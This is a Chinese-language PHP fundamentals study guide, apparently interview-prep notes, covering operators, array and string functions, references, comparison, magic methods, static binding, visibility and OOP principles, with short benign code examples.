<TOC />

## 基础篇

### Include和require的区别
1. require函数通常放在PHP程序的最前面，在PHP程序执行之前， 就会先读取require指定引入的文件，使它变成PHP程序网页的一部分。
2. include函数一般是放在流程控制的处理部分中。PHP程序在读到include的文件时， 才将它读进来，这种方式可以把程序执行时的流程简单化。
3. 他们两个的用途是一样的，不一定非要哪个放在最前面哪个放在中间， 他们最根本的区别在于错误处理的方式不一样。
4. require一个文件存在错误的话，那么程序就会中断执行，并显示致命错误
5. include一个文件存在错误的话，那么程序不会中断，会继续执行，并显示一个警告的错误
6. 其它区别：include有返回值，而require没有。

### PHP的变量类型
四种标量类型
1. boolean （布尔型）：这是最简单的类型，只有两种取值，可以为 TRUE/true 或 FALSE/false ,不区分大小写。
2. integer （整型）：在32 位操作系统中它的有效范围是：-2 147 483 648~+2 147 483 647。 整型值可以使用十进制，十六进制或八进制表示，前面可以加上可选的符号（- 或者 +）。 八进制表示数字前必须加上 0（零），十六进制表示数字前必须加上 0x。 
3. float （浮点型, 也称作 double)
4. string （字符串）：字符型变量不同于其他编程语言有字符与字符串之分， 在PHP 中，统一使用字符型变量来定义字符或者字符串。

两种复合类型
1. array （数组）：数组型变量是一种比较特殊的变量类型
2. object （对象）：对象也是一种特殊的数据类型。要创建object变量，请使用 new 关键字。

两种特殊类型
1. resource（资源）：源是一种特殊变量，保存了到外部资源的一个引用。 资源是通过专门的函数来建立和使用的。
2. NULL（NULL）：表示一个变量没有值。NULL 类型唯一可能的值就是 NULL。

### ??运算符(NULL 合并运算符)
由于日常使用中存在大量同时使用三元表达式和 isset()的情况，NULL 合并运算符使得变量存在且值不为NULL，
它就会返回自身的值，否则返回它的第二个操作数。
```
<?php
// 如果 $_GET['user'] 不存在返回 'nobody'，否则返回 $_GET['user'] 的值
$username = $_GET['user'] ?? 'nobody';
// 类似的三元运算符
$username = isset($_GET['user']) ? $_GET['user'] : 'nobody';
```

### <=> 太空船操作符（组合比较符）
太空船操作符用于比较两个表达式。当a大于、等于或小于b时它分别返回-1、0或1。
```
<?php
// 整型
echo 1 <=> 1; // 0
echo 1 <=> 2; // -1
echo 2 <=> 1; // 1

// 浮点型
echo 1.5 <=> 1.5; // 0
echo 1.5 <=> 2.5; // -1
echo 2.5 <=> 1.5; // 1
 
// 字符串
echo "a" <=> "a"; // 0
echo "a" <=> "b"; // -1
echo "b" <=> "a"; // 1
?>
```

### 通过 define() 定义常量数组
```
<?php
define('ANIMALS', [
    'dog',
    'cat',
    'bird'
]);
echo ANIMALS[1]; // 输出 "cat"
?>
```

### 整除
新增了整除函数 intdiv()
```
<?php
var_dump(intdiv(10, 3));
// 输出结果： int(3)
?>
```

### 了解大部分数组处理函数

http://php.net/manual/zh/ref.array.php

is_array — 检测变量是否是数组

explode — 使用一个字符串分割另一个字符串

implode — 将一个一维数组的值转化为字符串

split — 用正则表达式将字符串分割到数组中

preg_split — 通过一个正则表达式分隔字符串

unset — 释放给定的变量

array_change_key_case — 将数组中的所有键名修改为全大写或小写

array_chunk — 将一个数组分割成多个

array_column — 返回数组中指定的一列

array_combine — 创建一个数组，用一个数组的值作为其键名，另一个数组的值作为其值

array_count_values — 统计数组中所有的值

array_diff_assoc — 带索引检查计算数组的差集

array_diff_key — 使用键名比较计算数组的差集

array_diff_uassoc — 用用户提供的回调函数做索引检查来计算数组的差集

array_diff_ukey — 用回调函数对键名比较计算数组的差集

array_diff — 计算数组的差集

array_fill_keys — 使用指定的键和值填充数组

array_fill — 用给定的值填充数组

array_filter — 用回调函数过滤数组中的单元

array_flip — 交换数组中的键和值

array_intersect_assoc — 带索引检查计算数组的交集

array_intersect_key — 使用键名比较计算数组的交集

array_intersect_uassoc — 带索引检查计算数组的交集，用回调函数比较索引

array_intersect_ukey — 用回调函数比较键名来计算数组的交集

array_intersect — 计算数组的交集

array_key_exists — 检查数组里是否有指定的键名或索引

array_key_first —  获取数组的第一个键

array_key_last —  获取数组的最后一个键

array_keys — 返回数组中部分的或所有的键名

array_map — 为数组的每个元素应用回调函数

array_merge_recursive — 递归地合并一个或多个数组

array_merge — 合并一个或多个数组

array_multisort — 对多个数组或多维数组进行排序

array_pad — 以指定长度将一个值填充进数组

array_pop — 弹出数组最后一个单元（出栈）

array_product — 计算数组中所有值的乘积

array_push — 将一个或多个单元压入数组的末尾（入栈）

array_rand — 从数组中随机取出一个或多个单元

array_reduce — 用回调函数迭代地将数组简化为单一的值

array_replace_recursive — 使用传递的数组递归替换第一个数组的元素

array_replace — 使用传递的数组替换第一个数组的元素

array_reverse — 返回单元顺序相反的数组

array_search — 在数组中搜索给定的值，如果成功则返回首个相应的键名

array_shift — 将数组开头的单元移出数组

array_slice — 从数组中取出一段

array_splice — 去掉数组中的某一部分并用其它值取代

array_sum — 对数组中所有值求和

array_udiff_assoc — 带索引检查计算数组的差集，用回调函数比较数据

array_udiff_uassoc — 带索引检查计算数组的差集，用回调函数比较数据和索引

array_udiff — 用回调函数比较数据来计算数组的差集

array_uintersect_assoc — 带索引检查计算数组的交集，用回调函数比较数据

array_uintersect_uassoc — 带索引检查计算数组的交集，用单独的回调函数比较数据和索引

array_uintersect — 计算数组的交集，用回调函数比较数据

array_unique — 移除数组中重复的值

array_unshift — 在数组开头插入一个或多个单元

array_values — 返回数组中所有的值

array_walk_recursive — 对数组中的每个成员递归地应用用户函数

array_walk — 使用用户自定义函数对数组中的每个元素做回调处理

array — 新建一个数组

arsort — 对数组进行逆向排序并保持索引关系

asort — 对数组进行排序并保持索引关系

compact — 建立一个数组，包括变量名和它们的值

count — 计算数组中的单元数目，或对象中的属性个数

current — 返回数组中的当前单元

each — 返回数组中当前的键／值对并将数组指针向前移动一步

end — 将数组的内部指针指向最后一个单元

extract — 从数组中将变量导入到当前的符号表

in_array — 检查数组中是否存在某个值

key_exists — 别名 array_key_exists

key — 从关联数组中取得键名

krsort — 对数组按照键名逆向排序

ksort — 对数组按照键名排序

list — 把数组中的值赋给一组变量

natcasesort — 用“自然排序”算法对数组进行不区分大小写字母的排序

natsort — 用“自然排序”算法对数组排序

next — 将数组中的内部指针向前移动一位

pos — current 的别名

prev — 将数组的内部指针倒回一位

range — 根据范围创建数组，包含指定的元素

reset — 将数组的内部指针指向第一个单元

rsort — 对数组逆向排序

shuffle — 打乱数组

sizeof — count 的别名

sort — 对数组排序

uasort — 使用用户自定义的比较函数对数组中的值进行排序并保持索引关联

uksort — 使用用户自定义的比较函数对数组中的键名进行排序

usort — 使用用户自定义的比较函数对数组中的值进行排序

### 字符串处理函数  [区别 mb_ 系列函数

http://php.net/manual/zh/ref.strings.php

http://php.net/manual/zh/book.mbstring.php

addcslashes — 以 C 语言风格使用反斜线转义字符串中的字符

addslashes — 使用反斜线引用字符串

bin2hex — 函数把包含数据的二进制字符串转换为十六进制值

chop — rtrim 的别名

chr — 返回指定的字符

chunk_split — 将字符串分割成小块

convert_cyr_string — 将字符由一种 Cyrillic 字符转换成另一种

convert_uudecode — 解码一个 uuencode 编码的字符串

convert_uuencode — 使用 uuencode 编码一个字符串

count_chars — 返回字符串所用字符的信息

crc32 — 计算一个字符串的 crc32 多项式

crypt — 单向字符串散列

echo — 输出一个或多个字符串

explode — 使用一个字符串分割另一个字符串

fprintf — 将格式化后的字符串写入到流

get_html_translation_table — 返回使用 htmlspecialchars 和 htmlentities 后的转换表

hebrev — 将逻辑顺序希伯来文（logical-Hebrew）转换为视觉顺序希伯来文（visual-Hebrew）

hebrevc — 将逻辑顺序希伯来文（logical-Hebrew）转换为视觉顺序希伯来文（visual-Hebrew），并且转换换行符

hex2bin — 转换十六进制字符串为二进制字符串

html_entity_decode — 把 HTML 实体转换为字符

htmlentities — 将字符转换为 HTML 转义字符

htmlspecialchars_decode — 将特殊的 HTML 实体转换回普通字符

htmlspecialchars — 将特殊字符转换为 HTML 实体

implode — 将一个一维数组的值转化为字符串

join — 别名 implode

lcfirst — 使一个字符串的第一个字符小写

levenshtein — 计算两个字符串之间的编辑距离

localeconv — Get numeric formatting information

ltrim — 删除字符串开头的空白字符（或其他字符）

md5_file — 计算指定文件的 MD5 散列值

md5 — 计算字符串的 MD5 散列值

metaphone — Calculate the metaphone key of a string

money_format — 将数字格式化成货币字符串

nl_langinfo — Query language and locale information

nl2br — 在字符串所有新行之前插入 HTML 换行标记

number_format — 以千位分隔符方式格式化一个数字

ord — 转换字符串第一个字节为 0-255 之间的值

parse_str — 将字符串解析成多个变量

print — 输出字符串

printf — 输出格式化字符串

quoted_printable_decode — 将 quoted-printable 字符串转换为 8-bit 字符串

quoted_printable_encode — 将 8-bit 字符串转换成 quoted-printable 字符串

quotemeta — 转义元字符集

rtrim — 删除字符串末端的空白字符（或者其他字符）

setlocale — 设置地区信息

sha1_file — 计算文件的 sha1 散列值

sha1 — 计算字符串的 sha1 散列值

similar_text — 计算两个字符串的相似度

soundex — Calculate the soundex key of a string

sprintf — Return a formatted string

sscanf — 根据指定格式解析输入的字符

str_getcsv — 解析 CSV 字符串为一个数组

str_ireplace — str_replace 的忽略大小写版本

str_pad — 使用另一个字符串填充字符串为指定长度

str_repeat — 重复一个字符串

str_replace — 子字符串替换

str_rot13 — 对字符串执行 ROT13 转换

str_shuffle — 随机打乱一个字符串

str_split — 将字符串转换为数组

str_word_count — 返回字符串中单词的使用情况

strcasecmp — 二进制安全比较字符串（不区分大小写）

strchr — 别名 strstr

strcmp — 二进制安全字符串比较

strcoll — 基于区域设置的字符串比较

strcspn — 获取不匹配遮罩的起始子字符串的长度

strip_tags — 从字符串中去除 HTML 和 PHP 标记

stripcslashes — 反引用一个使用 addcslashes 转义的字符串

stripos — 查找字符串首次出现的位置（不区分大小写）

stripslashes — 反引用一个引用字符串

stristr — strstr 函数的忽略大小写版本

strlen — 获取字符串长度

strnatcasecmp — 使用“自然顺序”算法比较字符串（不区分大小写）

strnatcmp — 使用自然排序算法比较字符串

strncasecmp — 二进制安全比较字符串开头的若干个字符（不区分大小写）

strncmp — 二进制安全比较字符串开头的若干个字符

strpbrk — 在字符串中查找一组字符的任何一个字符

strpos — 查找字符串首次出现的位置

strrchr — 查找指定字符在字符串中的最后一次出现

strrev — 反转字符串

strripos — 计算指定字符串在目标字符串中最后一次出现的位置（不区分大小写）

strrpos — 计算指定字符串在目标字符串中最后一次出现的位置

strspn — 计算字符串中全部字符都存在于指定字符集合中的第一段子串的长度。

strstr — 查找字符串的首次出现

strtok — 标记分割字符串

strtolower — 将字符串转化为小写

strtoupper — 将字符串转化为大写

strtr — 转换指定字符

substr_compare — 二进制安全比较字符串（从偏移位置比较指定长度）

substr_count — 计算字串出现的次数

substr_replace — 替换字符串的子串

substr — 返回字符串的子串

trim — 去除字符串首尾处的空白字符（或者其他字符）

ucfirst — 将字符串的首字母转换为大写

ucwords — 将字符串中每个单词的首字母转换为大写

vfprintf — 将格式化字符串写入流

vprintf — 输出格式化字符串

vsprintf — 返回格式化字符串

wordwrap — 打断字符串为指定数量的字串

mb_check_encoding — 检查字符串在指定的编码里是否有效

mb_chr — Get a specific character

mb_convert_case — 对字符串进行大小写转换

mb_convert_encoding — 转换字符的编码

mb_convert_kana — Convert "kana" one from another ("zen-kaku", "han-kaku" and more)

mb_convert_variables — 转换一个或多个变量的字符编码

mb_decode_mimeheader — 解码 MIME 头字段中的字符串

mb_decode_numericentity — 根据 HTML 数字字符串解码成字符

mb_detect_encoding — 检测字符的编码

mb_detect_order — 设置/获取 字符编码的检测顺序

mb_encode_mimeheader — 为 MIME 头编码字符串

mb_encode_numericentity — Encode character to HTML numeric string reference

mb_encoding_aliases — Get aliases of a known encoding type

mb_ereg_match — Regular expression match for multibyte string

mb_ereg_replace_callback — Perform a regular expression search and replace with multibyte support using a callback

mb_ereg_replace — Replace regular expression with multibyte support

mb_ereg_search_getpos — Returns start point for next regular expression match

mb_ereg_search_getregs — Retrieve the result from the last multibyte regular expression match

mb_ereg_search_init — Setup string and regular expression for a multibyte regular expression match

mb_ereg_search_pos — Returns position and length of a matched part of the multibyte regular expression for a predefined multibyte string

mb_ereg_search_regs — Returns the matched part of a multibyte regular expression

mb_ereg_search_setpos — Set start point of next regular expression match

mb_ereg_search — Multibyte regular expression match for predefined multibyte string

mb_ereg — Regular expression match with multibyte support

mb_eregi_replace — Replace regular expression with multibyte support ignoring case

mb_eregi — Regular expression match ignoring case with multibyte support

mb_get_info — 获取 mbstring 的内部设置

mb_http_input — 检测 HTTP 输入字符编码

mb_http_output — 设置/获取 HTTP 输出字符编码

mb_internal_encoding — 设置/获取内部字符编码

mb_language — 设置/获取当前的语言

mb_list_encodings — 返回所有支持编码的数组

mb_ord — Get code point of character

mb_output_handler — 在输出缓冲中转换字符编码的回调函数

mb_parse_str — 解析 GET/POST/COOKIE 数据并设置全局变量

mb_preferred_mime_name — 获取 MIME 字符串

mb_regex_encoding — Set/Get character encoding for multibyte regex

mb_regex_set_options — Set/Get the default options for mbregex functions

mb_scrub — Description

mb_send_mail — 发送编码过的邮件

mb_split — 使用正则表达式分割多字节字符串

mb_str_split — Given a multibyte string, return an array of its characters

mb_strcut — 获取字符的一部分

mb_strimwidth — 获取按指定宽度截断的字符串

mb_stripos — 大小写不敏感地查找字符串在另一个字符串中首次出现的位置

mb_stristr — 大小写不敏感地查找字符串在另一个字符串里的首次出现

mb_strlen — 获取字符串的长度

mb_strpos — 查找字符串在另一个字符串中首次出现的位置

mb_strrchr — 查找指定字符在另一个字符串中最后一次的出现

mb_strrichr — 大小写不敏感地查找指定字符在另一个字符串中最后一次的出现

mb_strripos — 大小写不敏感地在字符串中查找一个字符串最后出现的位置

mb_strrpos — 查找字符串在一个字符串中最后出现的位置

mb_strstr — 查找字符串在另一个字符串里的首次出现

mb_strtolower — 使字符串小写

mb_strtoupper — 使字符串大写

mb_strwidth — 返回字符串的宽度

mb_substitute_character — 设置/获取替代字符

mb_substr_count — 统计字符串出现的次数

mb_substr — 获取部分字符串

### & 引用，结合案例分析

https://secure.php.net/manual/zh/language.references.php

引用是什么

不同的名字访问同一个变量内容。

与Ｃ语言中的指针是有差别的，Ｃ语言中的指针里面存储的是变量的内容在内存中存放的地址。

变量的引用

PHP 的引用允许你用两个变量来指向同一个内容

```
<?php
$a="ABC"; 
$b =&$a; 
echo $a;//这里输出:ABC 
echo $b;//这里输出:ABC 
$b="EFG"; 
echo $a;//这里$a的值变为EFG 所以输出EFG 
echo $b;//这里输出EFG 
```

函数的传址调用
```
<?php
function test(&$a) { 
$a=$a+100; 
} 
$b=1; 
echo $b;//输出１ 
test($b); // 实参为变量,传递引用.这里$b传递给函数的其实是$b的变量内容所处的内存地址，通过在函数里改变$a的值　就可以改变$b的值了 
// test(1); // 实参为值会出错,无法传递引用.PHP规定传递的引用不能为常量(Fatal error: Only variables can be passed by reference)
echo "<br>"; 
echo $b;//输出101 
```

函数的引用返回
```
<?php
function &test() { 
static $b=0;//申明一个静态变量 
$b=$b+1; 
echo $b; 
return $b; 
} 
$a=test();//这条语句会输出　$b的值　为１ 
$a=5; 
$a=test();//这条语句会输出　$b的值　为2 
$a=&test();//这条语句会输出　$b的值　为3 
$a=5; 
$a=test();//这条语句会输出　$b的值　为6 

通过这种方式$a=test();得到的其实不是函数的引用返回，
这跟普通的函数调用没有区别,至于原因:这是PHP的规定
PHP规定通过$a=&test(); 方式得到的才是函数的引用返回
$a=test()方式调用函数，只是将函数的值赋给$a而已，　
而$a做任何改变都不会影响到函数中的$b
而通过$a=&test()方式调用函数呢, 
他的作用是将return $b中的$b变量的内存地址与$a变量的内存地址　
指向了同一个地方即产生了相当于这样的效果($a=&b;) 
所以改变$a的值　也同时改变了$b的值　所以在执行了
$a=&test();
$a=5;
以后，$b的值变为了5
```

对象的引用
```
<?php 
class a{ 
var $abc="ABC"; 
} 
$b=new a; 
$c=$b; 
echo $b->abc;//这里输出ABC 
echo $c->abc;//这里输出ABC 
$b->abc="DEF"; 
echo $c->abc;//这里输出DEF 
以上代码是在PHP5中的运行效果在PHP5中对象的复制 是通过引用来实现的。
上列中$b=new a; $c=$b; 其实等效于$b=new a; $c=&$b; 
PHP5中默认就是通过引用来调用对象， 
但有时你可能想建立一个对象的副本，
并希望原来的对象的改变不影响到副本 . 
为了这样的目的，PHP定义了一个特殊的方法，
称为__clone. 引用的作用 如果程序比较大,
引用同一个对象的变量比较多,
并且希望用完该对象后手工清除它,
个人建议用 "&" 方式,然后用$var=null的方式清除. 
其它时候还是用php5的默认方式吧. 另外, 
php5中对于大数组的传递,建议用 "&" 方式, 毕竟节省内存空间使用。
```

取消引用

当你 unset 一个引用，只是断开了变量名和变量内容之间的绑定。这并不意味着变量内容被销毁了。
```
<?php 
$a = 1; 
$b =& $a; 
unset ($a); 
echo $a;// Notice: Undefined variable
echo $b;// 1
```

不会 unset $b，只是 $a。

global 引用

当用 global $var 声明一个变量时实际上建立了一个到全局变量的引用。也就是说和这样做是相同的
```
<?php 
$var =& $GLOBALS["var"]; 

这意味着，例如，unset $var 不会 unset 全局变量。 $this 在一个对象的方法中，$this 永远是调用它的对象的引用。

php中对于地址的指向（类似指针）功能不是由用户自己来实现的，是由Zend核心实现的

php中引用采用的是“写时拷贝”的原理，就是除非发生写操作，指向同一个地址的变量或者对象是不会被拷贝的。
```

通俗的讲
1:如果有下面的代码
```
$a="ABC";
$b=$a;
其实此时　$a与$b都是指向同一内存地址　而并不是$a与$b占用不同的内存
```

２:如果在上面的代码基础上再加上如下代码
```
$a="EFG";
由于$a与$b所指向的内存的数据要重新写一次了，此时Zend核心会自动判断　
自动为$b生产一个$a的数据拷贝，重新申请一块内存进行存储
```

### == 与 === 区别

https://stackoverflow.com/questions/80646/how-do-the-php-equality-double-equals-and-identity-triple-equals-comp

==运算符，则它们在两种不同类型之间进行转换.

===运算符,执行“类型安全比较”。这意味着只有两个操作数具有相同的类型和相同的值时，它才会返回true。
```
<?php
1 === 1: true
1 == 1: true
1 === "1": false // 1是整数，1是字符串
1 == "1": true //  “1”被转换为整数，即1
"foo" === "foo": true //  两个操作数都是字符串，具有相同的值
```

警告：具有相等成员的同一个类的两个实例与===运算符不匹配
```
$a = new stdClass();
$a->foo = "bar";
$b = clone $a;
var_dump($a === $b); // bool(false)
```

### isset 与 empty 区别]

https://stackoverflow.com/questions/1219542/in-where-shall-i-use-isset-and-empty

empty是判断变量值是非空或非零的值。

对应空定义包括：“”(空字符串)、0、“0”、NULL、FALSE、array()和$var(只声明但未赋值)。

也就是说当变量值为上述这些，empty返回TRUE，其他的都返回FALSE。

isset是检测变量是否设置，并且不是 NULL。变量设置可以从几个方面来说。
1. 最简单的就是变量是否先声明和赋值；
2. array中是否存在对应的index或key；
3. object中是否存在对应的属性。

从上面的两个function定义可以看到，在某些情况下，两者可以公用，但其区别还是很大的。

另外它们都只能检测变量，检测任何非变量的东西都将 导致解析错误。

例如直接检查另一个function的返回值(empty(otherFunction()))，

你将看到“Fatal error: Can’t use function return value in write context in”这样的错误。

另外isset可以一次检查多个变量，例如：isset($var1, $var2, $var3)，

当这三个值分别的isset都为TRUE结果为TRUE，否则结果为FALSE。

```
<?php
$sep = "<br />";
echo 'test undeclared var empty : ';
var_dump(empty($var));	// TRUE
echo $sep . 'test undeclared var isset : ';
var_dump(isset($var));	// FALSE

$var;
echo $sep . 'test declared var but no set value empty : ';
var_dump(empty($var));	// TRUE
echo $sep . 'test declared var but no set value isset : ';
var_dump(isset($var));	// FALSE, 变量申明未赋值，默认值为NULL

$var = NULL;
echo $sep . 'test declared var and set value NULL empty : ';
var_dump(empty($var));	// TRUE
echo $sep . 'test declared var and set value NULL isset : ';
var_dump(isset($var));	// FALSE, 变量申明赋值为NULL

$var1 = ''; $var2 = '0'; $var3 = 0; $var4 = FALSE; $var5 = array();

echo $sep . 'test \'\' empty : ';
var_dump(empty($var1));	// TRUE
echo $sep . 'test \'0\' empty : ';
var_dump(empty($var2));	// TRUE
echo $sep . 'test 0 empty : ';
var_dump(empty($var3));	// TRUE
echo $sep . 'test FALSE empty : ';
var_dump(empty($var4));	// TRUE
echo $sep . 'test array() empty : ';
var_dump(empty($var5));	// TRUE
echo $sep . 'test \'\', \'0\', 0, FALSE, array() isset : ';
var_dump(isset($var1, $var2, $var3, $var4, $var5));	// TRUE,  变量申明并赋值为空字符串
```

### 全部魔术函数理解

http://php.net/manual/zh/language.oop5.magic.php

__construct()
实例化对象时被调用， 当__construct和以类名为函数名的函数同时存在时，
__construct将被调用，另一个不被调用。

__destruct()
当删除一个对象或对象操作终止时被调用。

__call()
对象调用某个方法， 若方法存在，则直接调用；若不存在，则会去调用__call函数。

__get()
读取一个对象的属性时，若属性存在，则直接返回属性值； 若不存在，则会调用__get函数。

__set()
设置一个对象的属性时， 若属性存在，则直接赋值；
若不存在，则会调用__set函数。

__toString()
打印一个对象的时被调用。如echo obj;或printobj;或printobj;

__clone()
克隆对象时被调用。如：t=newTest();t=newTest();t1=clone $t;

__sleep()
serialize之前被调用。若对象比较大，想删减一点东东再序列化，可考虑一下此函数。

__wakeup()
unserialize时被调用，做些对象的初始化工作。

__isset()
检测一个对象的属性是否存在时被调用。如：isset($c->name)。

__unset()
unset一个对象的属性时被调用。如：unset($c->name)。

__set_state()
调用var_export时，被调用。用__set_state的返回值做为var_export的返回值。

__autoload()
实例化一个对象时，如果对应的类不存在，则该方法被调用。

__invoke()
当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用。
本特性只在 PHP 5.3.0 及以上版本有效。

__debugInfo()
该方法在var_dump()类对象的时候被调用，如果没有定义该方法，则var_dump会打印出所有的类属性
该方法在PHP 5.6.0 及以上版本有效。

### __toString() 作用
http://php.net/manual/en/language.oop5.magic.php#object.tostring

_toString()，类被当成字符串时的回应方法

作用： __toString() 方法用于一个类被当成字符串时应怎样回应。例如 `echo $obj;` 应该显示些什么。

注意： 此方法必须返回一个字符串，否则将发出一条 `E_RECOVERABLE_ERROR` 级别的致命错误。

警告： 不能在 __toString() 方法中抛出异常。这么做会导致致命错误。

```
<?php
class Person
{
    public $sex;
    public $name;
    public $age;
    public function __construct($name="",  $age=25, $sex='男')
    {
        $this->name = $name;
        $this->age  = $age;
        $this->sex  = $sex;
    }
    public function __toString()
    {
        return  'go go go';
    }
}
$person = new Person('小明'); // 初始赋值
echo $person;
/*
结果：
go go go
*/

那么如果类中没有 __toString() 这个魔术方法运行会发生什么呢？让我们来测试下：

class Person
{
    public $sex;
    public $name;
    public $age;
    public function __construct($name="",  $age=25, $sex='男')
    {
        $this->name = $name;
        $this->age  = $age;
        $this->sex  = $sex;
    }
}
$person = new Person('小明'); // 初始赋值
echo $person;
/*
结果： 
Catchable fatal error: Object of class Person could not be converted to string in D:phpStudyWWWtestindex.php on line 18
*/

很明显，页面报了一个致命错误，这是语法所不允许的。
```

### static 作用（区分类与函数内）

http://php.net/manual/zh/language.oop5.static.php

https://stackoverflow.com/questions/7508284/static-variables-in-php

Static（静态）关键字

static 关键字来定义静态方法和属性。static 也可用于定义静态变量以及后期静态绑定。

声明类属性或方法为静态，就可以不实例化类而直接访问。

静态属性不能通过一个类已实例化的对象来访问（但静态方法可以）。

为了兼容 PHP 4，如果没有指定访问控制，属性和方法默认为公有。

由于静态方法不需要通过对象即可调用，所以伪变量 $this 在静态方法中不可用。

静态属性不可以由对象通过 -> 操作符来访问。

用静态方式调用一个非静态方法会导致一个 E_STRICT 级别的错误。

就像其它所有的 PHP 静态变量一样，静态属性只能被初始化为文字或常量，不能使用表达式。

所以可以把静态属性初始化为整数或数组，但不能初始化为另一个变量或函数返回值，也不能指向一个对象。

自 PHP 5.3.0 起，可以用一个变量来动态调用类。但该变量的值不能为关键字 self，parent 或 static。
```
<?php
class Foo {
    static $my_var = 'Foo';
}

$x = new Foo();

echo $x::$my_var;  // works fine
echo $x->my_var;   // doesn't work - Notice: Undefined property: Foo::$my_var

<?php
class Foo
{
    public static $my_static = 'foo';

    public function staticValue() {
        return self::$my_static;
    }
}

class Bar extends Foo
{
    public function fooStatic() {
        return parent::$my_static;
    }
}

print Foo::$my_static . "\n"; // foo

$foo = new Foo();
print $foo->staticValue() . "\n"; // foo
print $foo->my_static . "\n"; // Undefined "Property" my_static 

print $foo::$my_static . "\n"; // Notice: Undefined property: Foo::$my_static
$classname = 'Foo';
print $classname::$my_static . "\n"; // foo   As of PHP 5.3.0

print Bar::$my_static . "\n"; // foo
$bar = new Bar();
print $bar->fooStatic() . "\n"; // foo
```

### static、$this、self 区别

https://stackoverflow.com/questions/4718808/php-can-static-replace-self

self::或是__CLASS__对当前类的引用，因此在一定范围内进行定义将无法满足对静态调用的需求。

static::在PHP 5.3.0中，这称为后期静态绑定。它解决了调用在运行时引用的类的限制。

考虑到这一点，我认为您现在可以充分看到并解决问题了。

如果您要继承几个静态成员，并且需要访问父成员和子成员，self::则将无法满足要求。

```
<?php
class Parent_{
    protected static $x = "parent";
    public static function makeTest(){
        echo "self => ".self::$x."<br>";
        echo "static => ".static::$x;       
    }
}

class Child_ extends Parent_{
    protected static $x = "child";
}

echo "<h4>using the Parent_ class</h4>";
Parent_::makeTest();

echo "<br><h4>using the Child_ class</h4>";
Child_::makeTest();

// using the Parent_ class
// self => parent
// static => parent
// using the Child_ class
// self => parent
// static => child
```

### private、protected、public、final 区别
protected        被保护的    本类，子类可以访问   
public           公有的      本类，子类，类的外面都可以访问
private          私有的      本类可以访问   
interface        接口：只含有抽象方法
abstract         抽象类：含有任意一个抽象方法的类；
抽象方法：没有方法体（没有大括号）的方法，eg:function a();。
final            最后的类和方法，不能再有子类，不能再重写
static           静态方法和属性，不依赖于对象产生，
不需要再new一个对象，直接冒号访问。如object类中有一个a方法，直接object::a();

### OOP 思想
OOP，Object Oriented Programming(面向对象的编程),还有OOD（面向对象的设计），OOA（面向对象的分析）。

很早很早以前的编程是面向过程的，比如实现一个算术运算1+1 = 2，通过这个简单的算法就可以解决问题。

但是随着时代的进步，人们不满足现有的算法了，因为问题越来越复杂不是1+1那么单纯了，比如一个班级的学生的数据分析这样就有了对象这个概念，一切事物皆对象。

将现实的事物抽象出来，注意抽象这个词是重点啊，把现实生活的事物以及关系 抽象成类，通过继承，实现，组合的方式把万事万物都给容纳了。 实现了对现实世界的抽象和数学建模。这是一次飞跃性的进步。

有一天你想吃鱼香肉丝了，怎么办呢？你有两个选择

1、自己买材料，肉，鱼香肉丝调料，蒜苔，胡萝卜等等然后切菜切肉，开炒，盛到盘子里。

2、去饭店，张开嘴：老板！来一份鱼香肉丝！

1是面向过程，2是面向对象。

面向对象有什么优势呢？首先你不需要知道鱼香肉丝是怎么做的，降低了耦合性。

如果你突然不想吃鱼香肉丝了，想吃洛阳白菜，对于1你可能不太容易了，还需要重新买菜，买调料什么的。

对于2，太容易了，大喊：老板！那个鱼香肉丝换成洛阳白菜吧，提高了可维护性。

总的来说就是降低耦合，提高维护性！

面向过程是具体化的，流程化的，解决一个问题，你需要一步一步的分析，一步一步的实现。

面向对象是模型化的，你只需抽象出一个类，这是一个封闭的盒子，在这里你拥有数据也拥有解决问题的方法。

面向对象的底层其实还是面向过程，把面向过程抽象成类，然后封装，方便我们我们使用的就是面向对象了。

面向过程：

优点：性能比面向对象好，因为类调用时需要实例化，开销比较大，比较消耗资源。

缺点：不易维护、不易复用、不易扩展.

面向对象:

优点：易维护、易复用、易扩展，由于面向对象有封装、继承、多态性的特性， 可以设计出低耦合的系统，使系统 更加灵活、更加易于维护 .

缺点：性能比面向过程差

面向对象的三大特性：

封装:隐藏对象的属性和实现细节，仅对外提供公共访问方式，将变化隔离，便于使用，提高复用性和安全性。

继承:提高代码复用性；继承是多态的前提。

多态:父类或接口定义的引用变量可以指向子类或具体实现类的实例对象。提高了程序的拓展性。

五大基本原则：

单一职责原则SRP(Single Responsibility Principle):类的功能要单一，不能包罗万象，跟杂货铺似的。

开放封闭原则OCP(Open－Close Principle):一个模块对于拓展是开放的，

对于修改是封闭的，想要增加功能热烈欢迎，想要修改，哼，一万个不乐意。

里式替换原则LSP(the Liskov Substitution Principle LSP):子类可以替换父类出现在父类能够出现的任何地方。 
比如你能代表你爸去你姥姥家干活。哈哈~~

依赖倒置原则DIP(the Dependency Inversion Principle DIP):高层次的模块不应该依赖于低层次的模块， 他们都应该依赖于抽象。抽象不应该依赖于具体实现，具体实现应该依赖于抽象。

就是你出国要说你是中国人，而不能说你是哪个村子的。比如说中国人是抽象的， 下面有具体的xx省，xx市，xx县。你要依赖的是抽象的中国人，而不是你是xx村的。

接口分离原则ISP(the Interface Segregation Principle ISP): 设计时采用多个与特定客户类有关的接口比采用一个通用的接口要好。 就比如一个手机拥有打电话，看视频，玩游戏等功能，把这几个功能拆分成不同的接口，比在一个接口里要好的多。

抽象会使复杂的问题更加简单化。

从以前面向过程的执行者，变成了张张嘴的指挥者。

面向对象更符合人类的思维，面向过程则是机器的思想 

### 抽象类、接口 分别使用场景
抽象类

PHP 5 支持抽象类和抽象方法。定义为抽象的类不能被实例化。

任何一个类，如果它里面至少有一个方法是被声明为抽象的，

那么这个类就必须被声明为抽象的。

被定义为抽象的方法只是声明了其调用方式（参数），不能定义其具体的功能实现。

继承一个抽象类的时候，子类必须定义父类中的所有抽象方法；

另外，这些方法的访问控制必须和父类中一样（或者更为宽松）。

例如某个抽象方法被声明为受保护的，那么子类中实现的方法就应该声明为受保护的或者公有的， 而不能定义为私有的。此外方法的调用方式必须匹配，即类型和所需参数数量必须一致。

例如，子类定义了一个可选参数，而父类抽象方法的声明里没有，则两者的声明并无冲突。 

这也适用于 PHP 5.4 起的构造函数。在 PHP 5.4 之前的构造函数声明可以不一样的。

接口

使用接口（interface），可以指定某个类必须实现哪些方法，但不需要定义这些方法的具体内容。

接口是通过 interface 关键字来定义的，就像定义一个标准的类一样，但其中定义所有的方法都是空的。

接口中定义的所有方法都必须是公有，这是接口的特性。

